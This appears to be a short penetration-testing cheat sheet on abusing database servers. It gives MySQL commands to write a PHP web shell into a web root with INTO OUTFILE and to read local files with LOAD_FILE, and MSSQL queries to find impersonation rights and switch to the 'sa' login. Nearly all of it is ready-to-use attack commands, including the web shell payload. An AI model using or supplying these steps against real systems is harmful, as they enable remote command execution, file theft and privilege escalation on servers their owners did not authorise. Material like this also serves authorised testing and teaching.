### How to write files via MySQL(like xp_cmdshell)
1)Check for write permissions(it's should return blank)
`show variables like "secure_file_priv";`

2)Write down a file
`SELECT "<PAYLOAD>" INTO OUTFILE '/PATH/TO/LOCAL/FILE';`
`Example:SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/webshell.php';`

### How to Read local files
 `select LOAD_FILE("</PATH/TO/FILE>");`

### How to Impersonate
1)Check for permissions for impersonation
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
```


2)Check for User and Roles
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```


3)Impersonate
```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
```